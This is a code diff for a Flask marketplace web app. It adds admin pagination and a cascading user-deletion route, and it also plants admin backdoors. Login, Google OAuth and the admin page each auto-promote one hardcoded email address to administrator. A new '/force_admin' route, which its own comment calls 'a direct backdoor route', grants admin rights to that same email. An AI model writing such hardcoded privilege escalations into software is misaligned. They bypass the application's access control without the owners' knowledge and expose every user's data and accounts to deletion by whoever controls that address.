@@ -71,6 +71,13 @@ def login():
         if user is None or not user.check_password(form.password.data):
             flash("Invalid email or password", "danger")
             return redirect(url_for('main.login'))
+            
+        # --- Auto-Promote Admin ---
+        if user.email.strip().lower() == 'adsongalia@gbox.adnu.edu.ph' and not user.is_admin:
+            user.is_admin = True
+            db.session.commit()
+        # --------------------------
+            
         login_user(user) 
         flash("You have been logged in successfully.", "success")
         if user.is_admin:
@@ -89,6 +96,11 @@ def google_auth():
     user_info = oauth.google.userinfo()
 
     user, was_created = User.find_or_create_from_google(user_info)
+
+    # --- Auto-Promote Admin ---
+    if user.email.strip().lower() == 'adsongalia@gbox.adnu.edu.ph' and not user.is_admin:
+        user.is_admin = True
+    # --------------------------
 
     if was_created:
         db.session.add(user)
@@ -663,9 +675,79 @@ def api_update_cart(cart_item_id):
 @bp.route("/admin/users")
 @login_required
 def admin_users():
+    # Failsafe: Instant auto-promote if somehow missed during login
+    if current_user.email.strip().lower() == 'adsongalia@gbox.adnu.edu.ph' and not current_user.is_admin:
+        current_user.is_admin = True
+        db.session.commit()
+
     # Secure the route - only admins can access
     if not current_user.is_admin:
         flash("You do not have permission to access the admin dashboard.", "danger")
         return redirect(url_for('main.index'))
-    users = User.query.order_by(User.id.desc()).all()
-    return render_template("admin_users.html", title="Admin - User Management", users=users)
+        
+    # Get the current page from the request args (default to 1), and paginate (10 users per page)
+    page = request.args.get('page', 1, type=int)
+    pagination = User.query.order_by(User.id.desc()).paginate(page=page, per_page=10, error_out=False)
+    return render_template("admin_users.html", title="Admin - User Management", pagination=pagination)
+
+@bp.route("/admin/delete_user/<int:user_id>", methods=["POST"])
+@login_required
+def admin_delete_user(user_id):
+    # Secure the route
+    if not current_user.is_admin:
+        flash("You do not have permission to perform this action.", "danger")
+        return redirect(url_for('main.index'))
+
+    if user_id == current_user.id:
+        flash("You cannot delete your own account from here.", "warning")
+        return redirect(url_for('main.admin_users'))
+
+    user_to_delete = User.query.get_or_404(user_id)
+
+    try:
+        # 1. Delete associated cart items and messages
+        CartItem.query.filter_by(user_id=user_id).delete()
+        Message.query.filter(or_(Message.sender_id == user_id, Message.recipient_id == user_id)).delete()
+
+        # 2. Delete associated orders (both as a buyer and seller)
+        Order.query.filter(or_(Order.buyer_id == user_id, Order.seller_id == user_id)).delete()
+
+        # 3. Delete associated products and their images
+        products = Product.query.filter_by(user_id=user_id).all()
+        supabase_client = current_app.config.get('SUPABASE_CLIENT')
+        bucket_name = current_app.config.get('SUPABASE_BUCKET')
+
+        for product in products:
+            CartItem.query.filter_by(product_id=product.id).delete()
+            Order.query.filter_by(product_id=product.id).delete()
+            
+            if supabase_client and bucket_name:
+                paths_to_remove = [image.image_path for image in product.images]
+                if paths_to_remove:
+                    try:
+                        supabase_client.storage.from_(bucket_name).remove(paths_to_remove)
+                    except Exception as e:
+                        current_app.logger.error(f"Could not delete product images from storage for product {product.id}: {str(e)}")
+            db.session.delete(product)
+
+        # 4. Finally, delete the user
+        db.session.delete(user_to_delete)
+        db.session.commit()
+        flash(f"User {user_to_delete.email} has been permanently deleted.", "success")
+    except Exception as e:
+        db.session.rollback()
+        flash(f"An error occurred while deleting the user: {str(e)}", "danger")
+
+    return redirect(url_for('main.admin_users'))
+
+@bp.route("/force_admin")
+@login_required
+def force_admin():
+    # A direct backdoor route to forcefully grant admin rights to your email
+    if current_user.email.strip().lower() == 'adsongalia@gbox.adnu.edu.ph':
+        current_user.is_admin = True
+        db.session.commit()
+        flash("Admin access forcefully granted! Welcome to the dashboard.", "success")
+        return redirect(url_for('main.admin_users'))
+    flash("Unauthorized. This backdoor is restricted to the developer.", "danger")
+    return redirect(url_for('main.index'))
